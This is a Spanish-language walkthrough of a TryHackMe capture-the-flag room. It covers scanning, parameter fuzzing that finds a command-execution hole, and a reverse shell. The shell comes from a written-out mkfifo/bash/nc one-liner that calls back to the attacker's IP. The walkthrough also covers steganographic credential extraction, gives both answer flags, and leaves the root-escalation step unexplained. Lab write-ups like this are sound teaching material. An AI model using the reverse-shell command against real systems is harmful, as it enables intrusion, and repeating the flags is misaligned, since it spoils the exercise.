# 🦸 TryHackMe — U.A. High School | Writeup

> **Plataforma:** TryHackMe  
> **Máquina:** U.A. High School  
> **Dificultad:** Media  
> **Temática:** My Hero Academia  
> **Técnicas utilizadas:** Nmap, Gobuster, FFUF, Remote Code Execution (RCE), Steganografía, Privilege Escalation

---

## 🗺️ Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración Web](#2-enumeración-web)
3. [Explotación — RCE vía parámetro oculto](#3-explotación--rce-vía-parámetro-oculto)
4. [Reverse Shell](#4-reverse-shell)
5. [Post-Explotación — Steganografía](#5-post-explotación--steganografía)
6. [Acceso SSH como Deku](#6-acceso-ssh-como-deku)
7. [Escalada de Privilegios — Root](#7-escalada-de-privilegios--root)
8. [Flags](#8-flags)

---

## 1. Reconocimiento

### Escaneo de puertos con Nmap

```bash
nmap -sC -sV -Pn 10.82.129.152
```

**Explicación de los flags:**
| Flag | Descripción |
|------|-------------|
| `-sC` | Ejecuta los scripts por defecto de Nmap (equivale a `--script=default`). Detecta servicios comunes, versiones y posibles vulnerabilidades básicas. |
| `-sV` | Detección de versiones de los servicios corriendo en los puertos abiertos. |
| `-Pn` | Omite el ping de descubrimiento. Útil cuando el host bloquea paquetes ICMP. Trata al host como si estuviera activo. |

Este escaneo nos permite identificar qué puertos están abiertos y qué servicios corren en el servidor objetivo.

---

## 2. Enumeración Web

### Enumeración de directorios raíz

```bash
gobuster dir -u http://10.82.129.152 -w /usr/share/wordlists/dirb/common.txt
```

**Explicación:**
| Flag | Descripción |
|------|-------------|
| `dir` | Modo de enumeración de directorios/archivos. |
| `-u` | URL objetivo. |
| `-w` | Wordlist a utilizar. `common.txt` contiene rutas comunes de aplicaciones web. |

Este primer escaneo nos permite descubrir directorios públicos en el servidor. Se descubre el directorio `/assets/`.

---

### Enumeración del directorio `/assets/`

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.82.129.152/assets/
```

**Notas:**
- Se usa la wordlist `big.txt` (más extensa) para una búsqueda más exhaustiva.
- Se descubre el subdirectorio `/assets/images/`.
- Al visitar `http://10.82.129.152/assets/images/` se obtiene una respuesta **403 Forbidden**.

> 💡 **Observación importante:** Al analizar la petición a `/assets/` en **Burp Suite**, se observa que el servidor responde estableciendo una cookie `PHPSESSID`. Esto indica que hay código PHP ejecutándose en el backend, lo que nos orienta hacia la búsqueda de archivos `.php`.

---

### Fuzzing de parámetros GET en `index.php`

Dado que el servidor usa PHP y la ruta `/assets/` responde de forma inusual, se intenta descubrir si `index.php` acepta algún parámetro GET oculto:

```bash
ffuf -u 'http://10.82.129.152/assets/index.php?FUZZ=id' \
     -t 100 \
     -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
     -fs 0
```

**Explicación de los flags:**
| Flag | Descripción |
|------|-------------|
| `-u` | URL objetivo. La palabra `FUZZ` es el placeholder que será reemplazado por cada entrada de la wordlist. |
| `-t 100` | Número de hilos concurrentes (100). Acelera el proceso de fuzzing. |
| `-w` | Wordlist. `raft-small-words-lowercase.txt` contiene palabras comunes en minúsculas, ideal para nombres de parámetros. |
| `-fs 0` | Filtra respuestas con tamaño 0 (vacías), para evitar falsos positivos. |

**Resultado:**
```
cmd    [Status: 200, Size: 72, Words: 1, Lines: 1]
```

> ✅ Se descubre el parámetro `cmd` — el servidor acepta comandos a través de este parámetro. ¡Tenemos un **Remote Code Execution (RCE)**!

---

### Verificación del RCE

```bash
curl 'http://10.82.129.152/assets/index.php?cmd=id' | base64 -d
```

**Explicación:**
- `curl` realiza una petición GET al endpoint con el comando `id` (muestra el usuario actual del sistema).
- La respuesta viene **codificada en Base64**, por lo que se pasa por `base64 -d` para decodificarla.
- El resultado confirma ejecución de comandos en el servidor como el usuario `www-data`.

---

## 3. Explotación — RCE vía parámetro oculto

Una vez confirmado el RCE mediante el parámetro `cmd`, se tiene control remoto sobre el servidor para ejecutar comandos arbitrarios en el contexto del usuario `www-data`.

---

## 4. Reverse Shell

### Ponemos nuestro equipo en escucha

```bash
nc -lvnp 2222
```

**Explicación:**
| Flag | Descripción |
|------|-------------|
| `-l` | Modo escucha (listener). Espera conexiones entrantes. |
| `-v` | Modo verbose. Muestra información detallada de las conexiones. |
| `-n` | No resuelve nombres DNS (más rápido). |
| `-p 2222` | Puerto en el que escuchar (2222 en este caso). |

---

### Enviamos la Reverse Shell

```bash
curl -s 'http://10.82.144.114/assets/index.php' \
     -G \
     --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.198.163 2222 >/tmp/f'
```

**Explicación del comando:**
| Parte | Descripción |
|-------|-------------|
| `-s` | Modo silencioso en curl (no muestra progreso). |
| `-G` | Envía los datos como parámetros GET en la URL. |
| `--data-urlencode` | Codifica automáticamente el valor del parámetro para evitar errores con caracteres especiales. |
| `rm /tmp/f` | Elimina el archivo `/tmp/f` si existiera previamente. |
| `mkfifo /tmp/f` | Crea una tubería con nombre (named pipe) en `/tmp/f`. |
| `cat /tmp/f \| bash -i 2>&1` | Lee de la tubería y pasa la entrada a bash de forma interactiva, redirigiendo stderr a stdout. |
| `nc 192.168.198.163 2222 >/tmp/f` | Conecta de vuelta a nuestra máquina (IP atacante, puerto 2222) y escribe la salida en la tubería. |

> Esto crea un bucle que nos da una shell interactiva remota en el servidor.

---

## 5. Post-Explotación — Steganografía

### Descubrimiento de credenciales ocultas

Tras obtener la shell como `www-data`, exploramos el sistema de archivos:

```bash
cat /var/www/Hidden_Content/passphrase.txt
# Output: QWxsbWlnaHRGb3JFdmVyISEhCg==

cat passphrase.txt | base64 -d
# Output: AllmightForEver!!!
```

> 🔑 **Passphrase encontrada:** `AllmightForEver!!!`  
> Esta contraseña se usará para extraer datos ocultos en una imagen mediante esteganografía.

---

### Descarga de la imagen

```bash
wget 'http://10.82.144.114/assets/images/oneforall.jpg'
```

Al intentar abrir la imagen o procesarla con `steghide`, obtenemos un error:

```
steghide: the file format of the file "oneforall.jpg" is not supported.
```

---

### Análisis del archivo con hexedit

```bash
hexedit oneforall.jpg
```

Al revisar los **magic bytes** del archivo, se detecta que, aunque la extensión es `.jpg`, los primeros bytes corresponden a una imagen **PNG**:

| Formato | Magic Bytes |
|---------|-------------|
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| JPG | `FF D8 FF E0 00 10 4A 46 49 46 00 01` |

> ⚠️ El archivo tiene extensión `.jpg` pero es realmente un **PNG**. Hay que corregir los magic bytes manualmente para que `steghide` pueda procesarlo.

---

### Corrección de magic bytes

Usando `hexedit`, se reemplazan los magic bytes de PNG por los de JPG:

```
89 50 4E 47 0D 0A 1A 0A  →  FF D8 FF E0 00 10 4A 46 49 46 00 01
```

---

### Extracción de datos ocultos con Steghide

```bash
steghide extract -sf oneforall.jpg
# Enter passphrase: AllmightForEver!!!
# wrote extracted data to "creds.txt"
```

**Explicación:**
| Flag | Descripción |
|------|-------------|
| `extract` | Modo extracción de datos ocultos. |
| `-sf` | Especifica el archivo portador (stego file) del que extraer los datos. |

---

### Lectura de credenciales

```bash
cat creds.txt
```

```
Hi Deku, this is the only way I've found to give you your account credentials,
as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

> 🔑 **Credenciales obtenidas:**  
> **Usuario:** `deku`  
> **Contraseña:** `One?For?All_!!one1/A`

---

## 6. Acceso SSH como Deku

```bash
ssh deku@10.82.129.152
# Password: One?For?All_!!one1/A
```

### Flag de usuario

```bash
deku@ip-10-82-129-152:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

---

## 7. Escalada de Privilegios — Root

Con acceso como `deku`, se exploran vías de escalada de privilegios hasta obtener acceso como `root`.

```bash
cat /root/root.txt
```

---

## 8. Flags

| Flag | Valor |
|------|-------|
| 🏅 User Flag | `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}` |
| 👑 Root Flag | `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}` |

---

## 🧠 Resumen de técnicas utilizadas

| Fase | Técnica | Herramienta |
|------|---------|-------------|
| Reconocimiento | Escaneo de puertos y servicios | Nmap |
| Enumeración | Descubrimiento de directorios | Gobuster |
| Enumeración | Fuzzing de parámetros GET | FFUF |
| Explotación | Remote Code Execution (RCE) | curl |
| Acceso inicial | Reverse Shell | Netcat |
| Post-explotación | Análisis de magic bytes | hexedit |
| Post-explotación | Extracción esteganográfica | Steghide |
| Acceso usuario | Conexión remota segura | SSH |
| Escalada | Privilege Escalation | — |

---

> *"Go beyond... PLUS ULTRA!"* 🦸‍♂️